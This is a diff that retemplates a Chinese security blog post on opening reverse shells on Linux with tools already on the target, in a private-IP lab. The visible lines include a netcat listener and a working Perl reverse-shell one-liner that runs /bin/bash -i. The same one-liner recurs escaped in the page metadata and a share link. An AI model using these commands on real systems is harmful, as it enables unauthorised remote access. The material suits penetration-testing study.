@@ -1,172 +1,178 @@
 <!DOCTYPE html>
-<html lang=zh>
+<html lang="en">
+
+<!-- Head tag -->
 <head>
-    <!-- so meta -->
+
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="0x01 前奏说明&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;很多时候,不到万不得已的情况下,我们完全没必要非往目标机器里传一堆工具,先不说由于各种防护[不仅仅是杀软的问题],传工具困难重重,有时由于自己的粗心,走的时候很容易把各种工具落在目标机器上,万一哪天被人看见,一看工具就大概知道你上来都干了啥,尤其是很多小伙伴在用别人工具时候也不爱做点儿什么手脚,后果你自然是很懂的,嘿嘿……其实,我一">
-<meta name="keywords" content="reverse shell">
-<meta property="og:type" content="article">
-<meta property="og:title" content="你和目标只差一个shell的距离">
-<meta property="og:url" content="https://apt404.github.io/2016/09/28/revese-shell/index.html">
-<meta property="og:site_name" content="APT404-不疯不魔怎么活">
-<meta property="og:description" content="0x01 前奏说明&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;很多时候,不到万不得已的情况下,我们完全没必要非往目标机器里传一堆工具,先不说由于各种防护[不仅仅是杀软的问题],传工具困难重重,有时由于自己的粗心,走的时候很容易把各种工具落在目标机器上,万一哪天被人看见,一看工具就大概知道你上来都干了啥,尤其是很多小伙伴在用别人工具时候也不爱做点儿什么手脚,后果你自然是很懂的,嘿嘿……其实,我一">
-<meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://apt404.github.io/img/linux_perl.png">
-<meta property="og:image" content="https://apt404.github.io/img/linux_dev_tcp.png">
-<meta property="og:image" content="https://apt404.github.io/img/linux_sshd_shell1.png">
-<meta property="og:image" content="https://apt404.github.io/img/linux_sshd_shell2.png">
-<meta property="og:image" content="https://apt404.github.io/img/linux_sshd_shell3.png">
-<meta property="og:image" content="https://apt404.github.io/img/linux_sshd_wrapper.png">
-<meta property="og:image" content="https://apt404.github.io/img/linux_bash_mkfifo.png">
-<meta property="og:image" content="https://apt404.github.io/img/linux_awk.png">
-<meta property="og:image" content="https://apt404.github.io/img/linux_telnet_two.png">
-<meta property="og:image" content="https://apt404.github.io/img/linux_telnet_mknod.png">
-<meta property="og:image" content="https://apt404.github.io/img/linux_py.png">
-<meta property="og:image" content="https://apt404.github.io/img/linux_sshd_croantab.png">
-<meta property="og:image" content="https://apt404.github.io/img/linux_sshd_php.png">
-<meta property="og:image" content="https://apt404.github.io/img/linux_ruby_shell.png">
-<meta property="og:image" content="https://apt404.github.io/img/linux_lua_shell.png">
-<meta property="og:image" content="https://apt404.github.io/img/linux_c_shell.png">
-<meta property="og:image" content="https://apt404.github.io/img/linux_icmp_shell.png">
-<meta property="og:image" content="https://apt404.github.io/img/linux_udp_shell.png">
-<meta property="og:image" content="https://apt404.github.io/img/linux_mini_shell.png">
-<meta property="og:image" content="https://apt404.github.io/img/linux_minrev_shell.png">
-<meta property="og:image" content="https://apt404.github.io/img/linux_poewrcat_shell.png">
-<meta property="og:updated_time" content="2017-12-19T06:10:04.000Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="你和目标只差一个shell的距离">
-<meta name="twitter:description" content="0x01 前奏说明&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;很多时候,不到万不得已的情况下,我们完全没必要非往目标机器里传一堆工具,先不说由于各种防护[不仅仅是杀软的问题],传工具困难重重,有时由于自己的粗心,走的时候很容易把各种工具落在目标机器上,万一哪天被人看见,一看工具就大概知道你上来都干了啥,尤其是很多小伙伴在用别人工具时候也不爱做点儿什么手脚,后果你自然是很懂的,嘿嘿……其实,我一">
-<meta name="twitter:image" content="https://apt404.github.io/img/linux_perl.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
     
+        <meta name="description" content="0x01 前奏说明&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;很多时候,不到万不得已的情况下,我们完全没必要非往目标机器里传一堆工具,先不说由于各种防护[不仅仅是杀软的问题],传工具困难重重,有时由于自己的粗心,走的时候很容易把各种工具落在目标机器上,万一哪天被人看见,一看工具就大概知道你上来都干了啥,尤其是很多小伙伴在用别人工具时候也不爱做点儿什么手脚,后果你自然是很懂的,嘿嘿……其实,我一直都建议,如果能利用目标系统自身的环境或者工具帮我们搞定的,最好就直接用那个,也省去了不少的麻烦,比如,最简单的,利用目标系统中自带的各种工具及语言环境帮我们弹回一个简单的可交互shell, 有shell,’夫何求’, 没错,你肯定会说,不就一个shell嘛,我直接用 coablt strike &amp;amp; msf 岂不更好,嘿嘿……其实,这里并不存在争论的点,不错,它俩确实挺好,不过,恶劣的环境总是有的,有时想把它俩用上确实比较费劲,好了,前戏就到此为止吧,下面我们就直奔主题……
+0x02 大致环境1234win7          192.168.1.128centos6.8     192.168.1.129win2008R2     192.168.1.131kali          192.168.1.147
+0x03 关于linux平台下弹shell的一些方式
+利用perl的socket,也是个人比较推荐的方式,因为现今几乎所有主流的linux发行版都已经装好了perl,细心的你也许会发现很多大马里弹shell的选项中一般都会有perl,后面bash -i的意思就是执行一个可交互的shell12C:\&amp;gt;nc -lvp 53# perl -e &amp;apos;use Socket;$i=&amp;quot;192.168.1.128&amp;quot;;$p=53;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&amp;#123;open(STDIN,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/bash -i&amp;quot;);&amp;#125;;&amp;apos;">
     
-        
-          
-              <link rel="shortcut icon" href="/images/favicon.ico">
-          
-        
-        
-          
-            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-          
-        
-        
-          
-            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-          
-        
+
+    <!--Author-->
     
-    <!-- title -->
-    <title>你和目标只差一个shell的距离</title>
-    <!-- styles -->
+        <meta name="author" content="John Doe">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="你和目标只差一个shell的距离"/>
+    
+
+    <!--Open Graph Description-->
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="APT404-不疯不魔怎么活"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>你和目标只差一个shell的距离 - APT404-不疯不魔怎么活</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
     <link rel="stylesheet" href="/css/style.css">
-    <!-- persian styles -->
+
+    <!-- Google Analytics -->
     
-      <link rel="stylesheet" href="/css/rtl.css">
-    
-    <!-- rss -->
-    
-    
+
+
 </head>
 
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-         
-          <li><a href="/">Home</a></li>
-         
-          <li><a href="/about/">About</a></li>
-         
-          <li><a href="/Search/">Search</a></li>
-        
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" href="/2016/10/05/hidden-webshell/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" href="/2016/09/27/install-py27-on-centos/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://apt404.github.io/2016/09/28/revese-shell/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=https://apt404.github.io/2016/09/28/revese-shell/&text=你和目标只差一个shell的距离"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://apt404.github.io/2016/09/28/revese-shell/&title=你和目标只差一个shell的距离"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://apt404.github.io/2016/09/28/revese-shell/&is_video=false&description=你和目标只差一个shell的距离"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=你和目标只差一个shell的距离&body=Check out this article: https://apt404.github.io/2016/09/28/revese-shell/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=https://apt404.github.io/2016/09/28/revese-shell/&title=你和目标只差一个shell的距离"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=https://apt404.github.io/2016/09/28/revese-shell/&title=你和目标只差一个shell的距离"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://apt404.github.io/2016/09/28/revese-shell/&title=你和目标只差一个shell的距离"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=https://apt404.github.io/2016/09/28/revese-shell/&title=你和目标只差一个shell的距离"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://apt404.github.io/2016/09/28/revese-shell/&name=你和目标只差一个shell的距离&description=&lt;p&gt;&lt;br&gt;&lt;br&gt;0x01 前奏说明&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;很多时候,不到万不得已的情况下,我们完全没必要非往目标机器里传一堆工具,先不说由于各种防护[不仅仅是杀软的问题],传工具困难重重,有时由于自己的粗心,走的时候很容易把各种工具落在目标机器上,万一哪天被人看见,一看工具就大概知道你上来都干了啥,尤其是很多小伙伴在用别人工具时候也不爱做点儿什么手脚,后果你自然是很懂的,嘿嘿……其实,我一直都建议,如果能利用目标系统自身的环境或者工具帮我们搞定的,最好就直接用那个,也省去了不少的麻烦,比如,最简单的,利用目标系统中自带的各种工具及语言环境帮我们弹回一个简单的可交互shell, 有shell,’夫何求’, 没错,你肯定会说,不就一个shell嘛,我直接用 coablt strike &amp;amp; msf 岂不更好,嘿嘿……其实,这里并不存在争论的点,不错,它俩确实挺好,不过,恶劣的环境总是有的,有时想把它俩用上确实比较费劲,好了,前戏就到此为止吧,下面我们就直奔主题……&lt;/p&gt;
-&lt;p&gt;0x02 大致环境&lt;br&gt;&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;win7          192.168.1.128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;centos6.8     192.168.1.129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;win2008R2     192.168.1.131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kali          192.168.1.147&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;0x03 关于linux平台下弹shell的一些方式&lt;/p&gt;
-&lt;p&gt;利用perl的socket,也是个人比较推荐的方式,因为现今几乎所有主流的linux发行版都已经装好了perl,细心的你也许会发现很多大马里弹shell的选项中一般都会有perl,后面bash -i的意思就是执行一个可交互的shell&lt;br&gt;&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;C:\&amp;gt;nc -lvp 53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# perl -e &amp;apos;use Socket;$i=&amp;quot;192.168.1.128&amp;quot;;$p=53;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&amp;#123;open(STDIN,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/bash -i&amp;quot;);&amp;#125;;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/img/linux_perl.png&#34; alt=&#34;&amp;#39;&amp;#39;&#34;&gt;&lt;br&gt;&lt;br&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-</ul>
 
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about.html">
+                    About
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    Categories
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact.html">
+                    Contact
+                </a>
+            </li>
+            
+        </ul>
     </div>
-    <div id="toc">
-      
-    </div>
-  </span>
 </div>
 
-    
-    <div class="content index my4">
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
         
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle" itemprop="name headline">
-        你和目标只差一个shell的距离
-    </h1>
+    </div>
+</header>
 
+        <section class="main">
+            
+<div class="post">
 
-
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">klion</span>
-      </span>
-      
-    <div class="postdate">
-        <time datetime="2016-09-28T02:13:41.000Z" itemprop="datePublished">2016-09-28</time>
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2016/09/28/revese-shell/">
+                你和目标只差一个shell的距离
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-09-28</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/shell/">shell</a>
+                </span>
+            
+        </div>
     </div>
 
+    <div class="content">
 
-      
-    <div class="article-tag">
-        <i class="fas fa-tag"></i>
-        <a class="tag-link" href="/tags/reverse-shell/">reverse shell</a>
-    </div>
+        <!-- Gallery -->
+        
 
-
-    </div>
-  </header>
-  
-
-  <div class="content" itemprop="articleBody">
-    <p><br><br>0x01 前奏说明<br>&nbsp;&nbsp;&nbsp;&nbsp;很多时候,不到万不得已的情况下,我们完全没必要非往目标机器里传一堆工具,先不说由于各种防护[不仅仅是杀软的问题],传工具困难重重,有时由于自己的粗心,走的时候很容易把各种工具落在目标机器上,万一哪天被人看见,一看工具就大概知道你上来都干了啥,尤其是很多小伙伴在用别人工具时候也不爱做点儿什么手脚,后果你自然是很懂的,嘿嘿……其实,我一直都建议,如果能利用目标系统自身的环境或者工具帮我们搞定的,最好就直接用那个,也省去了不少的麻烦,比如,最简单的,利用目标系统中自带的各种工具及语言环境帮我们弹回一个简单的可交互shell, 有shell,’夫何求’, 没错,你肯定会说,不就一个shell嘛,我直接用 coablt strike &amp; msf 岂不更好,嘿嘿……其实,这里并不存在争论的点,不错,它俩确实挺好,不过,恶劣的环境总是有的,有时想把它俩用上确实比较费劲,好了,前戏就到此为止吧,下面我们就直奔主题……</p>
+        <!-- Post Content -->
+        <p><br><br>0x01 前奏说明<br>&nbsp;&nbsp;&nbsp;&nbsp;很多时候,不到万不得已的情况下,我们完全没必要非往目标机器里传一堆工具,先不说由于各种防护[不仅仅是杀软的问题],传工具困难重重,有时由于自己的粗心,走的时候很容易把各种工具落在目标机器上,万一哪天被人看见,一看工具就大概知道你上来都干了啥,尤其是很多小伙伴在用别人工具时候也不爱做点儿什么手脚,后果你自然是很懂的,嘿嘿……其实,我一直都建议,如果能利用目标系统自身的环境或者工具帮我们搞定的,最好就直接用那个,也省去了不少的麻烦,比如,最简单的,利用目标系统中自带的各种工具及语言环境帮我们弹回一个简单的可交互shell, 有shell,’夫何求’, 没错,你肯定会说,不就一个shell嘛,我直接用 coablt strike &amp; msf 岂不更好,嘿嘿……其实,这里并不存在争论的点,不错,它俩确实挺好,不过,恶劣的环境总是有的,有时想把它俩用上确实比较费劲,好了,前戏就到此为止吧,下面我们就直奔主题……</p>
 <p>0x02 大致环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">win7          192.168.1.128</span><br><span class="line">centos6.8     192.168.1.129</span><br><span class="line">win2008R2     192.168.1.131</span><br><span class="line">kali          192.168.1.147</span><br></pre></td></tr></table></figure></p>
 <p>0x03 关于linux平台下弹shell的一些方式</p>
 <p>利用perl的socket,也是个人比较推荐的方式,因为现今几乎所有主流的linux发行版都已经装好了perl,细心的你也许会发现很多大马里弹shell的选项中一般都会有perl,后面bash -i的意思就是执行一个可交互的shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;nc -lvp 53</span><br><span class="line"># perl -e &apos;use Socket;$i=&quot;192.168.1.128&quot;;$p=53;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure></p>
@@ -222,98 +228,216 @@
 <p>我知道,基于这种思路,可以衍生出来的方法还有非常非常的多,有兴趣咱们可以一起研究,不可否认的是,虽然只是一个简单的shell,但中间涉及到的东西依然是很值得学习的</p>
 <p>0x07 一一些小结<br>&nbsp;&nbsp;&nbsp;&nbsp;反弹的核心说白点其实就是和目标系统建立socket(如果中间[不管是正向还是反向]端口被防火墙阻断了,那你可能就只能选择复用或者直接走更底层的协议了,还是那句话,只是一个shell而已,方法已经有了,怎么在实战中按照自己的需求改进,可能才是你更需要思考的,另外,我们也看到,反弹的时候,进程会一直处于挂起状态,实际中放到后台跑就好了</p>
 
-  </div>
-</article>
-
-
-
     </div>
+
     
-      <div id="footer-post-container">
-  <div id="footer-post">
 
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="/">Home</a></li>
-         
-          <li><a href="/about/">About</a></li>
-         
-          <li><a href="/Search/">Search</a></li>
-        
-      </ul>
-    </div>
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/reverse-shell/">#reverse shell</a>
+        </div>
+    
 
-    <div id="toc-footer" style="display: none">
-      
-    </div>
+    <!-- Comments -->
+    
 
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://apt404.github.io/2016/09/28/revese-shell/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=https://apt404.github.io/2016/09/28/revese-shell/&text=你和目标只差一个shell的距离"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://apt404.github.io/2016/09/28/revese-shell/&title=你和目标只差一个shell的距离"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://apt404.github.io/2016/09/28/revese-shell/&is_video=false&description=你和目标只差一个shell的距离"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=你和目标只差一个shell的距离&body=Check out this article: https://apt404.github.io/2016/09/28/revese-shell/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=https://apt404.github.io/2016/09/28/revese-shell/&title=你和目标只差一个shell的距离"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=https://apt404.github.io/2016/09/28/revese-shell/&title=你和目标只差一个shell的距离"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://apt404.github.io/2016/09/28/revese-shell/&title=你和目标只差一个shell的距离"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=https://apt404.github.io/2016/09/28/revese-shell/&title=你和目标只差一个shell的距离"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://apt404.github.io/2016/09/28/revese-shell/&name=你和目标只差一个shell的距离&description=&lt;p&gt;&lt;br&gt;&lt;br&gt;0x01 前奏说明&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;很多时候,不到万不得已的情况下,我们完全没必要非往目标机器里传一堆工具,先不说由于各种防护[不仅仅是杀软的问题],传工具困难重重,有时由于自己的粗心,走的时候很容易把各种工具落在目标机器上,万一哪天被人看见,一看工具就大概知道你上来都干了啥,尤其是很多小伙伴在用别人工具时候也不爱做点儿什么手脚,后果你自然是很懂的,嘿嘿……其实,我一直都建议,如果能利用目标系统自身的环境或者工具帮我们搞定的,最好就直接用那个,也省去了不少的麻烦,比如,最简单的,利用目标系统中自带的各种工具及语言环境帮我们弹回一个简单的可交互shell, 有shell,’夫何求’, 没错,你肯定会说,不就一个shell嘛,我直接用 coablt strike &amp;amp; msf 岂不更好,嘿嘿……其实,这里并不存在争论的点,不错,它俩确实挺好,不过,恶劣的环境总是有的,有时想把它俩用上确实比较费劲,好了,前戏就到此为止吧,下面我们就直奔主题……&lt;/p&gt;
-&lt;p&gt;0x02 大致环境&lt;br&gt;&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;win7          192.168.1.128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;centos6.8     192.168.1.129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;win2008R2     192.168.1.131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;kali          192.168.1.147&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;0x03 关于linux平台下弹shell的一些方式&lt;/p&gt;
-&lt;p&gt;利用perl的socket,也是个人比较推荐的方式,因为现今几乎所有主流的linux发行版都已经装好了perl,细心的你也许会发现很多大马里弹shell的选项中一般都会有perl,后面bash -i的意思就是执行一个可交互的shell&lt;br&gt;&lt;figure class=&#34;highlight plain&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;C:\&amp;gt;nc -lvp 53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;# perl -e &amp;apos;use Socket;$i=&amp;quot;192.168.1.128&amp;quot;;$p=53;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;quot;tcp&amp;quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&amp;#123;open(STDIN,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDOUT,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);open(STDERR,&amp;quot;&amp;gt;&amp;amp;S&amp;quot;);exec(&amp;quot;/bin/bash -i&amp;quot;);&amp;#125;;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;/img/linux_perl.png&#34; alt=&#34;&amp;#39;&amp;#39;&#34;&gt;&lt;br&gt;&lt;br&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-</ul>
+</div>
+        </section>
 
     </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
-  </div>
 </div>
 
-    
-    <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy; 2018 John Doe
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-         
-          <li><a href="/">Home</a></li>
-         
-          <li><a href="/about/">About</a></li>
-         
-          <li><a href="/Search/">Search</a></li>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
